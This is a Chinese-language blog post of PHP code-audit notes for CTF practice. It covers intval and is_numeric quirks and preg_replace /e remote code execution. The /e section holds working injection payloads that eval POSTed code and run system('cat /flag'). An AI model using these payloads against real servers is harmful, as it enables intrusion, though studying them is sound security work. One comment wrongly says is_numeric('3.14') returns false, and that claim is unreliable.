<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content='常见函数 is_numeric() 判断是否为数字\n1 2 3 4 5 6 7 8 9 $var1 = 123; $var2 = "3.14"; $var3 = "abc"; $var4 = "123abc"; echo is_numeric($var1); // 输出：1（true） echo is_numeric($var2); // 输出：0（false） echo is_numeric($var3); // 输出：0（false） echo is_numeric($var4); // 输出：0（false） intval() 字符串转换成十进制整数\n1 2 3 4 5 6 echo intval("123"); // 输出: 123 echo intval("+123"); // 输出: 123 echo intval("123.45"); // 输出: 123 echo intval("123abc"); // 输出: 123 echo intval("abc123"); // 输出: 0 echo intval("12.3abc45"); // 输出: 12 如果字符串以数字开头，则为开头的数字 如果字符串以非数字开头，则为0 PHP5 的 intval 不识别科学计数 1 if(intval($num) < 2020 && intval($num + 1) > 2021) {} payload: ?num=100e2\n在PHP5中， intval 不识别科学计数，遇到 e 直接结束，intval("100e2") 会被识别成 100\n'><title>php代码审计</title>
<link rel=canonical href=https://bu44er.ink/p/8hg4xmol/><link rel=stylesheet href=/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css><meta property='og:title' content="php代码审计"><meta property='og:description' content='常见函数 is_numeric() 判断是否为数字\n1 2 3 4 5 6 7 8 9 $var1 = 123; $var2 = "3.14"; $var3 = "abc"; $var4 = "123abc"; echo is_numeric($var1); // 输出：1（true） echo is_numeric($var2); // 输出：0（false） echo is_numeric($var3); // 输出：0（false） echo is_numeric($var4); // 输出：0（false） intval() 字符串转换成十进制整数\n1 2 3 4 5 6 echo intval("123"); // 输出: 123 echo intval("+123"); // 输出: 123 echo intval("123.45"); // 输出: 123 echo intval("123abc"); // 输出: 123 echo intval("abc123"); // 输出: 0 echo intval("12.3abc45"); // 输出: 12 如果字符串以数字开头，则为开头的数字 如果字符串以非数字开头，则为0 PHP5 的 intval 不识别科学计数 1 if(intval($num) < 2020 && intval($num + 1) > 2021) {} payload: ?num=100e2\n在PHP5中， intval 不识别科学计数，遇到 e 直接结束，intval("100e2") 会被识别成 100\n'><meta property='og:url' content='https://bu44er.ink/p/8hg4xmol/'><meta property='og:site_name' content="BU44ER's BLOG"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='PHP'><meta property='article:published_time' content='2024-10-04T01:45:39+08:00'><meta property='article:modified_time' content='2024-10-04T01:45:39+08:00'><meta name=twitter:title content="php代码审计"><meta name=twitter:description content='常见函数 is_numeric() 判断是否为数字\n1 2 3 4 5 6 7 8 9 $var1 = 123; $var2 = "3.14"; $var3 = "abc"; $var4 = "123abc"; echo is_numeric($var1); // 输出：1（true） echo is_numeric($var2); // 输出：0（false） echo is_numeric($var3); // 输出：0（false） echo is_numeric($var4); // 输出：0（false） intval() 字符串转换成十进制整数\n1 2 3 4 5 6 echo intval("123"); // 输出: 123 echo intval("+123"); // 输出: 123 echo intval("123.45"); // 输出: 123 echo intval("123abc"); // 输出: 123 echo intval("abc123"); // 输出: 0 echo intval("12.3abc45"); // 输出: 12 如果字符串以数字开头，则为开头的数字 如果字符串以非数字开头，则为0 PHP5 的 intval 不识别科学计数 1 if(intval($num) < 2020 && intval($num + 1) > 2021) {} payload: ?num=100e2\n在PHP5中， intval 不识别科学计数，遇到 e 直接结束，intval("100e2") 会被识别成 100\n'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_6bb6a4306bf01844.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar>
</a><span class=emoji>🍥</span></figure><div class=site-meta><h1 class=site-name><a href=/>BU44ER's BLOG</a></h1><h2 class=site-description>Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h2></div></header><ol class=menu-social><li><a href=https://github.com/cynicalight target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#is_numeric><code>is_numeric()</code></a></li><li><a href=#intval><code>intval()</code></a><ol><li><a href=#php5-的-intval-不识别科学计数>PHP5 的 intval 不识别科学计数</a></li><li><a href=#base-参数>base 参数</a></li></ol></li><li><a href=#show_source><code>show_source()</code></a></li><li><a href=#var_dump><code>var_dump()</code></a></li><li><a href=#scandir><code>scandir()</code></a></li><li><a href=#chr><code>chr()</code></a></li><li><a href=#file_get_contents><code>file_get_contents()</code></a></li><li><a href=#eval><code>eval()</code></a></li><li><a href=#sizeof><code>sizeof</code></a></li><li><a href=#preg_match><code>preg_match</code></a><ol><li><a href=#e-模式>/e 模式</a><ol><li><a href=#实战>实战</a></li><li><a href=#原理>原理</a></li></ol></li><li><a href=#php-正则反斜杠过滤问题>php 正则反斜杠过滤问题</a></li></ol></li></ol><ol><li><a href=#读取文件新姿势>读取文件新姿势</a><ol><li><a href=#highlight-高亮输出>highlight 高亮输出</a></li><li><a href=#无特殊字符的纯函数读取>无特殊字符的纯函数读取</a></li></ol></li><li><a href=#弱比较>弱比较</a><ol><li><a href=#整数-和-字符串-的弱比较>整数 和 字符串 的弱比较</a></li><li><a href=#弱比较和强比较的区别>弱比较和强比较的区别</a></li></ol></li><li><a href=#科学记数法>科学记数法</a></li><li><a href=#绕过md5>绕过md5</a><ol><li><a href=#数组绕过>数组绕过</a><ol><li><a href=#实例>实例</a></li></ol></li><li><a href=#科学计数绕过>科学计数绕过</a></li><li><a href=#md5-碰撞>md5 碰撞</a></li><li><a href=#哈希长度拓展攻击>哈希长度拓展攻击</a><ol><li><a href=#判断-php-生成字符串长度>判断 php 生成字符串长度</a></li></ol></li></ol></li><li><a href=#php字符串解析特性>php字符串解析特性</a><ol><li><a href=#绕过waf>绕过WAF</a><ol><li><a href=#实例-1>实例</a></li></ol></li></ol></li><li><a href=#publicprotectedprivate的区别>public、protected、private的区别</a></li><li><a href=#魔术方法>魔术方法</a></li><li><a href=#非法参数名传参>非法参数名传参</a><ol><li><ol><li><a href=#实例-2>实例</a></li></ol></li></ol></li><li><a href=#php-伪协议>php 伪协议</a><ol><li><a href=#file>file://</a></li><li><a href=#php>php://</a></li><li><a href=#data>data://</a></li><li><a href=#实例-3>实例</a></li></ol></li><li><a href=#escapeshellarg-和-escapeshellcmd>escapeshellarg 和 escapeshellcmd</a><ol><li><a href=#escapeshellarg>escapeshellarg</a></li><li><a href=#escapeshellcmd>escapeshellcmd</a></li><li><a href=#对于-arg--cmd-的参数注入>对于 arg + cmd 的参数注入</a><ol><li><a href=#实战-buuctf-2018online-tool>实战： BUUCTF 2018&mdash;Online Tool</a></li></ol></li></ol></li><li><a href=#变量覆盖>变量覆盖</a><ol><li><ol><li><a href=#例题>例题</a></li></ol></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/8hg4xmol/>php代码审计</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Oct 04, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>6 minute read</time></div></footer></div></header><section class=article-content><h1 id=常见函数>常见函数</h1><h2 id=is_numeric><code>is_numeric()</code></h2><p>判断是否为数字</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$var1</span> <span class=o>=</span> <span class=mi>123</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$var2</span> <span class=o>=</span> <span class=s2>&#34;3.14&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$var3</span> <span class=o>=</span> <span class=s2>&#34;abc&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$var4</span> <span class=o>=</span> <span class=s2>&#34;123abc&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>is_numeric</span><span class=p>(</span><span class=nv>$var1</span><span class=p>);</span>  <span class=c1>// 输出：1（true）
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nx>is_numeric</span><span class=p>(</span><span class=nv>$var2</span><span class=p>);</span>  <span class=c1>// 输出：0（false）
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nx>is_numeric</span><span class=p>(</span><span class=nv>$var3</span><span class=p>);</span>  <span class=c1>// 输出：0（false）
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nx>is_numeric</span><span class=p>(</span><span class=nv>$var4</span><span class=p>);</span>  <span class=c1>// 输出：0（false）
</span></span></span></code></pre></td></tr></table></div></div><hr><h2 id=intval><code>intval()</code></h2><p>字符串转换成十进制整数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>echo</span> <span class=nx>intval</span><span class=p>(</span><span class=s2>&#34;123&#34;</span><span class=p>);</span>        <span class=c1>// 输出: 123
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nx>intval</span><span class=p>(</span><span class=s2>&#34;+123&#34;</span><span class=p>);</span>       <span class=c1>// 输出: 123
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nx>intval</span><span class=p>(</span><span class=s2>&#34;123.45&#34;</span><span class=p>);</span>     <span class=c1>// 输出: 123
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nx>intval</span><span class=p>(</span><span class=s2>&#34;123abc&#34;</span><span class=p>);</span>     <span class=c1>// 输出: 123
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nx>intval</span><span class=p>(</span><span class=s2>&#34;abc123&#34;</span><span class=p>);</span>     <span class=c1>// 输出: 0
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nx>intval</span><span class=p>(</span><span class=s2>&#34;12.3abc45&#34;</span><span class=p>);</span>  <span class=c1>// 输出: 12
</span></span></span></code></pre></td></tr></table></div></div><ul><li>如果字符串以数字开头，则为开头的数字</li><li>如果字符串以非数字开头，则为0</li></ul><h3 id=php5-的-intval-不识别科学计数>PHP5 的 intval 不识别科学计数</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>intval</span><span class=p>(</span><span class=nv>$num</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>2020</span> <span class=o>&amp;&amp;</span> <span class=nx>intval</span><span class=p>(</span><span class=nv>$num</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>2021</span><span class=p>)</span> <span class=p>{}</span>
</span></span></code></pre></td></tr></table></div></div><p>payload: <code>?num=100e2</code></p><p>在PHP5中， intval 不识别科学计数，遇到 e 直接结束，<code>intval("100e2")</code> 会被识别成 100</p><ul><li>后续版本中，科学计数字符串转数字时会被自动识别成相应数字</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>echo</span> <span class=nx>intval</span><span class=p>(</span><span class=mf>1e10</span><span class=p>);</span> <span class=c1>// 10000000000 
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nx>intval</span><span class=p>(</span><span class=s1>&#39;1e10&#39;</span><span class=p>);</span> <span class=c1>// 10000000000
</span></span></span></code></pre></td></tr></table></div></div><h3 id=base-参数>base 参数</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=ne>int</span> <span class=n>intval</span> <span class=p>(</span> <span class=n>mixed</span> <span class=o>$</span><span class=k>var</span> <span class=p>[,</span> <span class=ne>int</span> <span class=o>$</span><span class=n>base</span> <span class=o>=</span> <span class=mi>10</span> <span class=p>]</span> <span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>如果有第二个base参数 x，表示把第一个字符串参数看成x进制。</p><p>如果 base参数 = 0，通过检测 var 的格式来决定使用的进制：</p><ul><li>如果字符串包括了 &ldquo;0x&rdquo; (或 &ldquo;0X&rdquo;) 的前缀，使用 16 进制 (hex)；否则，</li><li>如果字符串以 &ldquo;0&rdquo; 开始，使用 8 进制(octal)；否则，</li><li>将使用 10 进制 (decimal)。</li></ul><h2 id=show_source><code>show_source()</code></h2><p>显示指定文件的源代码</p><hr><h2 id=var_dump><code>var_dump()</code></h2><p>打印变量的详细信息，包括变量的类型和值</p><hr><h2 id=scandir><code>scandir()</code></h2><p>获取指定目录</p><ul><li><code>scandir(/)</code> 获取根目录</li></ul><hr><h2 id=chr><code>chr()</code></h2><p>将 ASCII 码转换为对应的字符</p><ul><li>可拼接：<code>file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code></li></ul><hr><h2 id=file_get_contents><code>file_get_contents()</code></h2><p>获取指定路径的<strong>文件的内容</strong></p><hr><h2 id=eval><code>eval()</code></h2><p>将字符串作为php代码执行</p><p><strong>eval()是一个语言构造器，不能被可变函数调用</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>eval<span class=o>(</span>eval<span class=o>(</span>...<span class=o>))</span> <span class=c1>#错误</span>
</span></span><span class=line><span class=cl>eval<span class=o>(</span>assert<span class=o>(</span>eval<span class=o>(</span>...<span class=o>)))</span> <span class=c1>#正确</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;?php assert<span class=o>(</span>POST<span class=o>[</span><span class=s1>&#39;a&#39;</span><span class=o>])</span> <span class=p>;</span>&gt; <span class=c1>#错误</span>
</span></span><span class=line><span class=cl><span class=c1>#由于php版本问题，也不能直接用assert构造一句话，所以只能采用eval(assert(eval(...)))</span>
</span></span></code></pre></td></tr></table></div></div><hr><h2 id=sizeof><code>sizeof</code></h2><p>返回<strong>数组</strong>长度</p><hr><h2 id=preg_match><code>preg_match</code></h2><ul><li>[[../../../编程语言/正则表达式]]</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>preg_replace</span> <span class=p>(</span> <span class=nx>mixed</span> <span class=nv>$pattern</span> <span class=p>,</span> <span class=nx>mixed</span> <span class=nv>$replacement</span> <span class=p>,</span> <span class=nx>mixed</span> <span class=nv>$subject</span> <span class=p>[,</span> <span class=nx>int</span> <span class=nv>$limit</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span> <span class=p>[,</span> <span class=nx>int</span> <span class=o>&amp;</span><span class=nv>$count</span> <span class=p>]]</span> <span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。</p><ul><li>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</li><li>$replacement: 用于替换的字符串或字符串数组。</li><li>$subject: 要搜索替换的目标字符串或字符串数组。</li></ul><hr><h3 id=e-模式>/e 模式</h3><p><strong>preg_replace</strong> <strong>/e</strong> 模式下存在 RCE，php 7 被删除</p><h4 id=实战>实战</h4><p>注入环境：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>preg_replace</span><span class=p>(</span> <span class=s1>&#39;/(&#39;</span> <span class=o>.</span> <span class=nv>$key</span> <span class=o>.</span> <span class=s1>&#39;)/ei&#39;</span><span class=p>,</span> <span class=s1>&#39;strtolower(&#34;\\1&#34;)&#39;</span><span class=p>,</span> <span class=nv>$value</span> <span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>key、value 是 GET 传入的键值对</li><li><code>/ei</code> 表示替换内容当作 php 执行</li></ul><p>payload1：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl> ?\S*=${phpinfo()}
</span></span></code></pre></td></tr></table></div></div><ul><li><code>\S</code> 利用 GET 上传的非法字符解析原理，解析成 <code>.</code></li><li><code>.*</code> 是 key，<code>${phpinfo()}</code> 是 value</li><li><code>.*</code> 贪婪匹配任意字符任意次，匹配 <code>${phpinfo()}</code></li><li>php 执行 <code>strtolower("{${phpinfo()}}")</code></li><li>原理如下</li></ul><p>payload2：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>?</span><span class=nx>\S</span><span class=o>*=</span><span class=err>$</span><span class=p>{</span><span class=k>eval</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=nx>cmd</span><span class=p>])}</span>
</span></span><span class=line><span class=cl><span class=c1>// 再 POST 一个参数 cmd=system(&#34;cat /flag&#34;);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// 或者解析一个题目给出的可以利用的函数
</span></span></span><span class=line><span class=cl><span class=c1>// function getFlag(){
</span></span></span><span class=line><span class=cl><span class=c1>//   	@eval($_GET[&#39;cmd&#39;]);
</span></span></span><span class=line><span class=cl><span class=c1>// }
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>?</span><span class=nx>\S</span><span class=o>*=</span><span class=err>$</span><span class=p>{</span><span class=nx>getFlag</span><span class=p>()}</span><span class=o>&amp;</span><span class=nx>cmd</span><span class=o>=</span><span class=nx>system</span><span class=p>(</span><span class=s2>&#34;ls&#34;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=原理>原理</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>phpinfo</span><span class=p>());</span> <span class=c1>// 结果：布尔 true
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>strtolower</span><span class=p>(</span><span class=nx>phpinfo</span><span class=p>()));</span><span class=c1>// 结果：字符串 &#39;1&#39;
</span></span></span><span class=line><span class=cl><span class=c1>// 先执行 phpinfo 得到返回值是 1，再 strtolower(&#34;1&#34;) 返回值是 1 
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>preg_replace</span><span class=p>(</span><span class=s1>&#39;/(.*)/ie&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>,</span><span class=s1>&#39;{${phpinfo()}}&#39;</span><span class=p>));</span><span class=c1>// 结果：字符串&#39;11&#39;
</span></span></span><span class=line><span class=cl><span class=c1>// 先解析 {${phpinfo()}}，其中 phpinfo 返回 1， 解析得 {$1}
</span></span></span><span class=line><span class=cl><span class=c1>// var_dump(preg_replace(&#39;/(.*)/i&#39;,&#39;1&#39;,&#39;任意字符&#39;)); 返回 11
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>preg_replace</span><span class=p>(</span><span class=s1>&#39;/(.*)/ie&#39;</span><span class=p>,</span><span class=s1>&#39;strtolower(&#34;\\1&#34;)&#39;</span><span class=p>,</span><span class=s1>&#39;{${phpinfo()}}&#39;</span><span class=p>));</span><span class=c1>// 结果：空字符串&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>preg_replace</span><span class=p>(</span><span class=s1>&#39;/(.*)/ie&#39;</span><span class=p>,</span><span class=s1>&#39;strtolower(&#34;{${phpinfo()}}&#34;)&#39;</span><span class=p>,</span><span class=s1>&#39;{${phpinfo()}}&#39;</span><span class=p>));</span><span class=c1>// 结果：空字符串&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=c1>// 这里的&#39;strtolower(&#34;{${phpinfo()}}&#34;)&#39;执行后相当于 strtolower(&#34;{${1}}&#34;) 又相当于 strtolower(&#34;{null}&#34;) 又相当于 &#39;&#39; 空字符串
</span></span></span></code></pre></td></tr></table></div></div><h3 id=php-正则反斜杠过滤问题>php 正则反斜杠过滤问题</h3><p><code>preg_match</code> 匹配反斜杠需要四个反斜杠：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/</span><span class=se>\\\\</span><span class=s2>/&#34;</span><span class=p>,</span> <span class=nv>$str1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>// preg_match(&#34;/\\/&#34;, $str1) 无效
</span></span></span></code></pre></td></tr></table></div></div><ul><li>原理：先由 php 解析器解析成<code>\\</code> ，再由正则匹配解析成<code>\</code></li></ul><p>再看一个特殊的：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/</span><span class=se>\\</span><span class=s2>|</span><span class=se>\\\\</span><span class=s2>/&#34;</span><span class=p>,</span> <span class=nv>$str2</span><span class=p>)</span>
